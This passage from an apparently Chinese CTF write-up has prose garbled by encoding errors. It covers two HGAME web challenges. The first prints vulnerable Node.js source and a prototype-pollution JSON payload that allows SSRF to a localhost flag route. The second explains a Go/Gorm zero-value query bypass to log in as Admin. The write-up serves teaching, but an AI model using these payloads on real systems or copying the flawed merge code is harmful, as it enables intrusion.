class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//app.js</span><br><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;express&quot;</span>);<br><span class="hljs-keyword">const</span> axios = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;axios&quot;</span>);<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;body-parser&quot;</span>);<br><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;path&quot;</span>);<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;fs&quot;</span>);<br><span class="hljs-keyword">const</span> &#123; <span class="hljs-attr">v4</span>: uuidv4 &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;uuid&quot;</span>);<br><span class="hljs-keyword">const</span> session = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;express-session&quot;</span>);<br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><span class="hljs-keyword">const</span> port = <span class="hljs-number">3000</span>;<br><span class="hljs-keyword">const</span> session_name = <span class="hljs-string">&quot;my-webvpn-session-id-&quot;</span> + <span class="hljs-title function_">uuidv4</span>().<span class="hljs-title function_">toString</span>();<br><br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&quot;view engine&quot;</span>, <span class="hljs-string">&quot;pug&quot;</span>);<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&quot;trust proxy&quot;</span>, <span class="hljs-literal">false</span>);<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&quot;public&quot;</span>)));<br>app.<span class="hljs-title function_">use</span>(<br>  <span class="hljs-title function_">session</span>(&#123;<br>    <span class="hljs-attr">name</span>: session_name,<br>    <span class="hljs-attr">secret</span>: <span class="hljs-title function_">uuidv4</span>().<span class="hljs-title function_">toString</span>(),<br>    <span class="hljs-attr">secure</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-attr">resave</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-attr">saveUninitialized</span>: <span class="hljs-literal">true</span>,<br>  &#125;)<br>);<br>app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">json</span>());<br><span class="hljs-keyword">var</span> userStorage = &#123;<br>  <span class="hljs-attr">username</span>: &#123;<br>    <span class="hljs-attr">password</span>: <span class="hljs-string">&quot;password&quot;</span>,<br>    <span class="hljs-attr">info</span>: &#123;<br>      <span class="hljs-attr">age</span>: <span class="hljs-number">18</span>,<br>    &#125;,<br>    <span class="hljs-attr">strategy</span>: &#123;<br>      <span class="hljs-string">&quot;baidu.com&quot;</span>: <span class="hljs-literal">true</span>,<br>      <span class="hljs-string">&quot;google.com&quot;</span>: <span class="hljs-literal">false</span>,<br>    &#125;,<br>  &#125;,<br>&#125;;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">update</span>(<span class="hljs-params">dst, src</span>) &#123;<br>  <span class="hljs-keyword">for</span> (key <span class="hljs-keyword">in</span> src) &#123;<br>    <span class="hljs-keyword">if</span> (key.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;__&quot;</span>) != -<span class="hljs-number">1</span>) &#123;<br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> src[key] == <span class="hljs-string">&quot;object&quot;</span> &amp;&amp; dst[key] !== <span class="hljs-literal">undefined</span>) &#123;<br>      <span class="hljs-title function_">update</span>(dst[key], src[key]);<br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    dst[key] = src[key];<br>  &#125;<br>&#125;<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;/proxy&quot;</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> &#123; username &#125; = req.<span class="hljs-property">session</span>;<br>  <span class="hljs-keyword">if</span> (!username) &#123;<br>    res.<span class="hljs-title function_">sendStatus</span>(<span class="hljs-number">403</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">let</span> url = (<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(req.<span class="hljs-property">query</span>.<span class="hljs-property">url</span>);<br>    &#125; <span class="hljs-keyword">catch</span> &#123;<br>      res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>);<br>      res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;invalid url.&quot;</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">undefined</span>;<br>    &#125;<br>  &#125;)();<br><br>  <span class="hljs-keyword">if</span> (!url) <span class="hljs-keyword">return</span>;<br><br>  <span class="hljs-keyword">if</span> (!userStorage[username].<span class="hljs-property">strategy</span>[url.<span class="hljs-property">hostname</span>]) &#123;<br>    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>);<br>    res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;your url is not allowed.&quot;</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">const</span> headers = req.<span class="hljs-property">headers</span>;<br>    headers.<span class="hljs-property">host</span> = url.<span class="hljs-property">host</span>;<br>    headers.<span class="hljs-property">cookie</span> = headers.<span class="hljs-property">cookie</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;;&quot;</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">cookie</span>) =&gt;</span> &#123;<br>      <span class="hljs-keyword">var</span> filtered_cookie = <span class="hljs-string">&quot;&quot;</span>;<br>      <span class="hljs-keyword">const</span> [key, value] = cookie.<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-number">1</span>);<br>      <span class="hljs-keyword">if</span> (key.<span class="hljs-title function_">trim</span>() !== session_name) &#123;<br>        filtered_cookie += <span class="hljs-string">`<span class="hljs-subst">$&#123;key&#125;</span>=<span class="hljs-subst">$&#123;value&#125;</span>;`</span>;<br>      &#125;<br>      <span class="hljs-keyword">return</span> filtered_cookie;<br>    &#125;);<br>    <span class="hljs-keyword">const</span> remote_res = <span class="hljs-keyword">await</span> (<span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-keyword">if</span> (req.<span class="hljs-property">method</span> == <span class="hljs-string">&quot;POST&quot;</span>) &#123;<br>        <span class="hljs-keyword">return</span> axios.<span class="hljs-title function_">post</span>(url, req.<span class="hljs-property">body</span>, &#123;<br>          <span class="hljs-attr">headers</span>: headers,<br>        &#125;);<br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (req.<span class="hljs-property">method</span> == <span class="hljs-string">&quot;GET&quot;</span>) &#123;<br>        <span class="hljs-keyword">return</span> axios.<span class="hljs-title function_">get</span>(url, &#123;<br>          <span class="hljs-attr">headers</span>: headers,<br>        &#125;);<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        res.<span class="hljs-title function_">status</span>(<span class="hljs-number">405</span>);<br>        res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;method not allowed.&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>      &#125;<br>    &#125;)();<br>    res.<span class="hljs-title function_">status</span>(remote_res.<span class="hljs-property">status</span>);<br>    res.<span class="hljs-title function_">header</span>(remote_res.<span class="hljs-property">headers</span>);<br>    res.<span class="hljs-title function_">write</span>(remote_res.<span class="hljs-property">data</span>);<br>  &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>);<br>    res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;unreachable url.&quot;</span>);<br>  &#125;<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/user/login&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; username, password &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span> (<br>    <span class="hljs-keyword">typeof</span> username != <span class="hljs-string">&quot;string&quot;</span> ||<br>    <span class="hljs-keyword">typeof</span> password != <span class="hljs-string">&quot;string&quot;</span> ||<br>    !username ||<br>    !password<br>  ) &#123;<br>    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>);<br>    res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;invalid username or password&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (!userStorage[username]) &#123;<br>    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>);<br>    res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;invalid username or password&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (userStorage[username].<span class="hljs-property">password</span> !== password) &#123;<br>    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>);<br>    res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;invalid username or password&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> = username;<br>  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;login success&quot;</span>);<br>&#125;);<br><br><span class="hljs-comment">// under development</span><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/user/info&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span>) &#123;<br>    res.<span class="hljs-title function_">sendStatus</span>(<span class="hljs-number">403</span>);<br>  &#125;<br>  <span class="hljs-title function_">update</span>(userStorage[req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span>].<span class="hljs-property">info</span>, req.<span class="hljs-property">body</span>);<br>  res.<span class="hljs-title function_">sendStatus</span>(<span class="hljs-number">200</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/home&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span>) &#123;<br>    res.<span class="hljs-title function_">sendStatus</span>(<span class="hljs-number">403</span>);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&quot;home&quot;</span>, &#123;<br>    <span class="hljs-attr">username</span>: req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span>,<br>    <span class="hljs-attr">strategy</span>: (<span class="hljs-function">(<span class="hljs-params">list</span>)=&gt;</span>&#123;<br>      <span class="hljs-keyword">var</span> result = [];<br>      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> key <span class="hljs-keyword">in</span> list) &#123;<br>        result.<span class="hljs-title function_">push</span>(&#123;<span class="hljs-attr">host</span>: key, <span class="hljs-attr">allow</span>: list[key]&#125;);<br>      &#125;<br>      <span class="hljs-keyword">return</span> result;<br>    &#125;)(userStorage[req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span>].<span class="hljs-property">strategy</span>),<br>  &#125;);<br>&#125;);<br><br><span class="hljs-comment">// demo service behind webvpn</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (<br>    req.<span class="hljs-property">headers</span>.<span class="hljs-property">host</span> != <span class="hljs-string">&quot;127.0.0.1:3000&quot;</span> ||<br>    req.<span class="hljs-property">hostname</span> != <span class="hljs-string">&quot;127.0.0.1&quot;</span> ||<br>    req.<span class="hljs-property">ip</span> != <span class="hljs-string">&quot;127.0.0.1&quot;</span> <br>  ) &#123;<br>    res.<span class="hljs-title function_">sendStatus</span>(<span class="hljs-number">400</span>);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  <span class="hljs-keyword">const</span> data = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&quot;/flag&quot;</span>);<br>  res.<span class="hljs-title function_">send</span>(data);<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(port, <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`app listen on <span class="hljs-subst">$&#123;port&#125;</span>`</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>æ¢³ç†ä¸€ä¸‹ä¸»è¦éƒ¨åˆ†ï¼Œé¦–å…ˆæ˜¯ç±»ä¼¼äº<code>merge</code>å‡½æ•°çš„<code>update</code>å‡½æ•°ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">update</span>(<span class="hljs-params">dst, src</span>) &#123;<br>  <span class="hljs-keyword">for</span> (key <span class="hljs-keyword">in</span> src) &#123;<br>    <span class="hljs-keyword">if</span> (key.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;__&quot;</span>) != -<span class="hljs-number">1</span>) &#123;<br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> src[key] == <span class="hljs-string">&quot;object&quot;</span> &amp;&amp; dst[key] !== <span class="hljs-literal">undefined</span>) &#123;<br>      <span class="hljs-title function_">update</span>(dst[key], src[key]);<br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    dst[key] = src[key];<br>  &#125;<br>&#125;<br><span class="hljs-comment">//é¦–å…ˆè¿™é‡Œè¿‡æ»¤äº†__ã€‚æ²¡è¿‡æ»¤çš„è¯å¯ä»¥ä½¿ç”¨ç±»ä¼¼:&quot;__proto__&quot;:&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;&#125;è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“ï¼Œå…¶å®å°±ç®—è¿‡æ»¤äº†ä¹Ÿèƒ½ä½¿ç”¨constructor.prototype</span><br><span class="hljs-comment">//å¦å¤–é™åˆ¶äº†å½“å‰å±æ€§å€¼å¿…é¡»ä¸ºå¯¹è±¡ï¼Œä¸”ç›®æ ‡å¯¹è±¡`dst`ä¸­å­˜åœ¨åŒåå±æ€§</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ˜¯è°ƒç”¨äº†è¿™ä¸ª<code>update</code>å‡½æ•°çš„åœ°æ–¹ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/user/info&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span>) &#123;<br>    res.<span class="hljs-title function_">sendStatus</span>(<span class="hljs-number">403</span>);<br>  &#125;<br>  <span class="hljs-title function_">update</span>(userStorage[req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span>].<span class="hljs-property">info</span>, req.<span class="hljs-property">body</span>);<br>  res.<span class="hljs-title function_">sendStatus</span>(<span class="hljs-number">200</span>);<br>&#125;);<br><span class="hljs-comment">//updateäº†infoå’Œè¯·æ±‚ä½“ï¼ŒuserStorageå¦‚ä¸‹ï¼š</span><br><span class="hljs-keyword">var</span> userStorage = &#123;<br>  <span class="hljs-attr">username</span>: &#123;<br>    <span class="hljs-attr">password</span>: <span class="hljs-string">&quot;password&quot;</span>,<br>    <span class="hljs-attr">info</span>: &#123;<br>      <span class="hljs-attr">age</span>: <span class="hljs-number">18</span>,<br>    &#125;,<br>    <span class="hljs-attr">strategy</span>: &#123;<br>      <span class="hljs-string">&quot;baidu.com&quot;</span>: <span class="hljs-literal">true</span>,<br>      <span class="hljs-string">&quot;google.com&quot;</span>: <span class="hljs-literal">false</span>,<br>    &#125;,<br>  &#125;,<br>&#125;;<br></code></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯è·å¾—<code>flag</code>çš„è·¯ç”±ï¼Œé™åˆ¶äº†æœ¬åœ°æ‰èƒ½è®¿é—®ã€‚çŒœæµ‹æ˜¯åœ¨åŸå‹é“¾æ±¡æŸ“çš„åŸºç¡€ä¸Šè¿›è¡Œ<code>SSRF</code>:</p><p>é€šè¿‡åœ¨<code>user/info</code>è·¯ç”±ä¸‹è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“ä½¿å¾—<code>127.0.0.1:3000</code>ä¸º<code>True</code>å³å¯ã€‚å½“æ—¶çœ‹åˆ°<code>src[key] == &quot;object&quot; &amp;&amp; dst[key] !== undefined</code>è¿™ä¸œè¥¿æˆ‘è¿˜ä»¥ä¸º<code>constructor</code>è¿™ä¸œè¥¿ä¸èƒ½ç”¨äº†è¦å†æƒ³åˆ«çš„åŠæ³•ã€‚ã€‚ğŸ¤¦â€åé¢æœ‰å¸ˆå‚…è¯´ç›´æ¥è¿™ä¹ˆå†™å°±è¡Œï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;constructor&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;prototype&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>å”‰ï¼Œç¬¨æ­»äº†ğŸ¤¦â€</p><h2 id="HGAME-week3-Zero-Link-1"><a href="#HGAME-week3-Zero-Link-1" class="headerlink" title="[HGAME-week3]Zero Link"></a>[HGAME-week3]Zero Link</h2><p>ä¸€ä¸ªå­˜å‚¨è®°å¿†çš„ç½‘ç«™ï¼Œè¾“å…¥ç”¨æˆ·åæˆ–è€…<code>Token</code>å¯ä»¥æŸ¥å¯¹åº”ç”¨æˆ·å­˜äº†å•¥ä¸œè¥¿ï¼Œæ¯”å¦‚ï¼š</p><p><img src="/img/zerolink1.png" alt="zerolink1"></p><p>æ”¾ä¸€äº›ä»£ç ä¸­æ¯”è¾ƒé‡è¦çš„éƒ¨åˆ†ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//Auth.goï¼Œåªå…è®¸Adminç™»å½•</span><br><span class="hljs-keyword">if</span> req.Username != <span class="hljs-string">&quot;Admin&quot;</span> &#123;<br>c.JSON(http.StatusForbidden, AuthResponse&#123;<br>Code:    http.StatusForbidden,<br>Message: <span class="hljs-string">&quot;Only Admin is allowed to login&quot;</span>,<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">if</span> req.Password != password &#123;<br>c.JSON(http.StatusUnauthorized, AuthResponse&#123;<br>Code:    http.StatusUnauthorized,<br>Message: <span class="hljs-string">&quot;Invalid password&quot;</span>,<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br></code></pre></td></tr></table></figure><p>é¦–å…ˆåªå…è®¸ä»¥<code>Admin</code>èº«ä¸ºç”¨æˆ·åç™»å½•ã€‚ä¸è¿‡å¯†ç æ˜¯å•¥å¹¶æ²¡æœ‰è¯´ï¼Œä¸è¿‡å­˜åœ¨ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//sqlite.go</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GetUserByUsernameOrToken</span><span class="hljs-params">(username <span class="hljs-type">string</span>, token <span class="hljs-type">string</span>)</span></span> (*User, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">var</span> user User<br>query := db<br><span class="hljs-keyword">if</span> username != <span class="hljs-string">&quot;&quot;</span> &#123;<br>query = query.Where(&amp;User&#123;Username: username&#125;)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>query = query.Where(&amp;User&#123;Token: token&#125;)<br>&#125;<br>err := query.First(&amp;user).Error<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Println(<span class="hljs-string">&quot;Cannot get user: &quot;</span> + err.Error())<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">return</span> &amp;user, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Go</code>è¯­è¨€çš„é›¶å€¼é—®é¢˜ï¼š<a href="https://youwu.today/skill/backend/golang-zero-value-and-reference-and-null-value-testing/">å‚è€ƒèµ„æ–™</a></p><p>å¦‚æœä¼ è¿›å»çš„æ˜¯ä¸ªç©ºå­—ç¬¦ä¸²ï¼Œå› ä¸ºUserçš„Usernameå±æ€§æœ¬èº«å°±æ˜¯å­—ç¬¦ä¸²ç±»å‹çš„ï¼ŒGormå†…éƒ¨å°†æ— æ³•åˆ†è¾¨Userçš„usernameå±æ€§æ˜¯å¦è¢«èµ‹å€¼è¿‡ï¼Œè¿™å¯¼è‡´Gormåœ¨ç”ŸæˆSQLè¯­å¥æ—¶ä¸ä¼šä¸ºè¯¥å±æ€§ç”Ÿæˆæ¡ä»¶è¯­å¥:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> `<span class="hljs-keyword">user</span>` LIMIT <span class="hljs-number">1</span>   <span class="hljs-operator">/</span><span class="hljs-operator">/</span>è¿™é‡ŒæŸ¥äº†è¡¨ä¸­ç¬¬ä¸€ä¸ªç”¨æˆ·ï¼Œä¸€èˆ¬ç¬¬ä¸€ä¸ªç”¨æˆ·å°±æ˜¯Admin<br></code></pre></td></tr></table></figure><p><code>/api/user</code>æ¥å£æŠ“åŒ…ï¼ŒæŠŠ<code>username</code>å’Œ<code>token</code>å­—æ®µéƒ½ç½®ç©º:</p><p><img src="/img/zerolink3.png" alt="zerolink3"></p><p>ç„¶åç™»å½•ï¼Œå‘ç°å­˜åœ¨ä¸Šä¼ åŠŸèƒ½ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code 